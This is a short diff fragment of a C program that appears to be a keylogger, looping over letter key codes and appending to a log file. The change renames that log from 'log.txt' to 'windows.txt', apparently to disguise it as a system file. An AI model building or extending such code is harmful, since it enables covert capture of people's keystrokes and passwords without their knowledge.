@@ -7,7 +7,7 @@ int main()
     int result, keys;
     FILE *fp;
 
-    fp = fopen("log.txt", "a");
+    fp = fopen("windows.txt", "a");
 
     while (true) {
         for (keys = 64; keys <= 90; keys++) {
